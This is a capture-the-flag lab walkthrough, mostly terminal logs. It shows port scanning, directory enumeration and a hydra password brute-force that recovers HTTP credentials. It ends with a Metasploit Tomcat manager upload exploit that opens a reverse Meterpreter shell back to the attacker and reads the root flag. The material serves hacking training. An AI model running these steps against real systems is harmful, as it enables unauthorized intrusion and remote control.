```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.114.167.173 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-27 00:18 EDT
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 16.73% done; ETC: 00:18 (0:00:20 remaining)
Nmap scan report for 10.114.167.173
Host is up (0.26s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d1:e1:a9:58:e2:45:08:ee:fd:d9:be:a1:10:b0:e9:6e (RSA)
|   256 0b:b4:03:a5:47:fa:ef:65:5f:23:c9:7d:41:df:6e:7f (ECDSA)
|_  256 36:46:d9:71:3f:53:ec:bb:db:b8:53:d6:ac:d2:e1:b6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.76 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.114.167.173 -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,txt,js
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.167.173
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,js,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 298]
/.htaccess.txt        (Status: 403) [Size: 302]
/.hta                 (Status: 403) [Size: 293]
/.hta.js              (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 298]
/.hta.txt             (Status: 403) [Size: 297]
/.hta.php             (Status: 403) [Size: 297]
/.htpasswd.js         (Status: 403) [Size: 301]
/.htpasswd.php        (Status: 403) [Size: 302]
/.htaccess.php        (Status: 403) [Size: 302]
/.htaccess.js         (Status: 403) [Size: 301]
/.htpasswd.txt        (Status: 403) [Size: 302]
/guidelines           (Status: 301) [Size: 321] [--> http://10.114.167.173/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 461]
/server-status        (Status: 403) [Size: 302]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

<img width="708" height="126" alt="image" src="https://github.com/user-attachments/assets/2d70aab7-629c-4ad0-86e6-8ade9b937caa" />

```
┌──(kali㉿kali)-[~]
└─$ hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.112.145.69 http-get /protected/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-27 00:32:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.112.145.69:80/protected/
[80][http-get] host: 10.112.145.69   login: bob   password: bubbles
[STATUS] attack finished for 10.112.145.69 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-27 00:32:37
```

<img width="917" height="356" alt="image" src="https://github.com/user-attachments/assets/6bb8652e-a2ca-45fd-917c-45a9b287ade5" />

```

┌──(kali㉿kali)-[~]
└─$ nikto -h 10.114.167.173 -id bob:bubbles
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.114.167.173
+ Target Hostname:    10.114.167.173
+ Target Port:        80
+ Start Time:         2026-07-27 00:10:04 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: a8, size: 583d315d43a92, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ Successfully authenticated to realm 'protected' with user-supplied credentials.
+ /protected/: This might be interesting: has been seen in web logs from an unknown scanner.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Transport endpoint is not connected
+ Scan terminated: 20 error(s) and 8 item(s) reported on remote host
+ End Time:           2026-07-27 00:30:24 (GMT-4) (1220 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: View advanced module options with advanced
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project
```

<img width="752" height="547" alt="image" src="https://github.com/user-attachments/assets/7d57adee-15f0-4df6-965a-f6ebb00cbe65" />

```
msf > search Tomcat_mgr_upload

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_upload  2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   1    \_ target: Java Universal           .                .          .      .
   2    \_ target: Windows Universal        .                .          .      .
   3    \_ target: Linux x86                .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/tomcat_mgr_upload
After interacting with a module you can manually set a TARGET with set TARGET 'Linux x86'

msf > use 0
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf exploit(multi/http/tomcat_mgr_upload) > options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supporte
                                            d proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                            oit/basics/using-metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be us
                                            ed)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.217.130  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.
```

```
msf exploit(multi/http/tomcat_mgr_upload) > set lhost 192.168.170.150
lhost => 192.168.170.150
msf exploit(multi/http/tomcat_mgr_upload) > set rhost 10.114.167.173
rhost => 10.114.167.173
msf exploit(multi/http/tomcat_mgr_upload) > set rport 1234
rport => 1234
msf exploit(multi/http/tomcat_mgr_upload) > set httpPassword bubbles
httpPassword => bubbles
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername bob
httpusername => bob
msf exploit(multi/http/tomcat_mgr_upload) > run
[*] Started reverse TCP handler on 192.168.170.150:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying Zk9AKy...
[*] Executing Zk9AKy...
[*] Sending stage (58073 bytes) to 10.114.167.173
[*] Undeploying Zk9AKy ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (192.168.170.150:4444 -> 10.114.167.173:51072) at 2026-07-26 23:44:06 -0400
```

```
meterpreter > ls
Listing: /
==========

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100667/rw-rw-rwx  166       fil   2026-07-26 22:59:56 -0400  .badr-info
040776/rwxrwxrw-  4096      dir   2019-03-11 02:13:25 -0400  bin
040776/rwxrwxrw-  4096      dir   2019-03-11 02:13:35 -0400  boot
040776/rwxrwxrw-  3280      dir   2026-07-26 22:59:48 -0400  dev
040776/rwxrwxrw-  4096      dir   2026-07-26 23:00:00 -0400  etc
040776/rwxrwxrw-  4096      dir   2026-07-26 23:00:00 -0400  home
100666/rw-rw-rw-  12713476  fil   2019-03-11 02:13:35 -0400  initrd.img
040776/rwxrwxrw-  4096      dir   2019-02-12 12:47:22 -0500  lib
040776/rwxrwxrw-  4096      dir   2019-02-12 12:28:02 -0500  lib64
040776/rwxrwxrw-  16384     dir   2019-02-12 12:37:53 -0500  lost+found
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  media
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  mnt
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  opt
040776/rwxrwxrw-  0         dir   2026-07-26 22:59:40 -0400  proc
040776/rwxrwxrw-  4096      dir   2019-03-11 12:06:14 -0400  root
040776/rwxrwxrw-  880       dir   2026-07-26 23:00:02 -0400  run
040776/rwxrwxrw-  12288     dir   2019-03-11 02:13:26 -0400  sbin
040776/rwxrwxrw-  4096      dir   2019-03-10 17:52:41 -0400  snap
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  srv
040776/rwxrwxrw-  0         dir   2026-07-26 22:59:42 -0400  sys
040776/rwxrwxrw-  4096      dir   2026-07-26 23:44:03 -0400  tmp
040776/rwxrwxrw-  4096      dir   2019-02-12 12:27:12 -0500  usr
040776/rwxrwxrw-  4096      dir   2019-03-10 18:19:00 -0400  var
100666/rw-rw-rw-  7030080   fil   2019-01-17 12:53:59 -0500  vmlinuz

meterpreter > cd root
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100667/rw-rw-rwx  47    fil   2019-03-11 12:06:14 -0400  .bash_history
100667/rw-rw-rwx  3106  fil   2015-10-22 13:15:21 -0400  .bashrc
040777/rwxrwxrwx  4096  dir   2019-03-11 11:30:33 -0400  .nano
100667/rw-rw-rwx  148   fil   2015-08-17 11:30:33 -0400  .profile
040777/rwxrwxrwx  4096  dir   2019-03-10 17:52:32 -0400  .ssh
100667/rw-rw-rwx  658   fil   2019-03-11 12:05:22 -0400  .viminfo
100666/rw-rw-rw-  33    fil   2019-03-11 12:05:22 -0400  flag.txt
040776/rwxrwxrw-  4096  dir   2019-03-10 17:52:43 -0400  snap

meterpreter > cat flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```
